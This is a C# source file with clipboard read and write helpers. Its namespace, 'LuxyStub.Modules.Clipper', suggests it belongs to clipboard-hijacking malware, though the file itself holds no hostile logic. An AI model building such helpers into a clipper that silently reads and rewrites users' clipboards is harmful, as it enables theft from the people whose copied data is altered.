using System.Threading;

namespace LuxyStub.Modules.Clipper
{
    internal static class Clipboard
    {
        public static string GetText()
        {
            var copyValue = "";
            try
            {
                var staThread = new Thread(
                    delegate () { copyValue = System.Windows.Forms.Clipboard.GetText(); });
                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
                staThread.Join();
            }
            catch
            {

            }
            return copyValue;
        }

        public static void SetText(string text)
        {
            var staThread = new Thread(
                delegate ()
                {
                    try
                    {
                        System.Windows.Forms.Clipboard.SetText(text);
                    }
                    catch
                    {
                        // ignored
                    }
                });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();
        }
    }
}
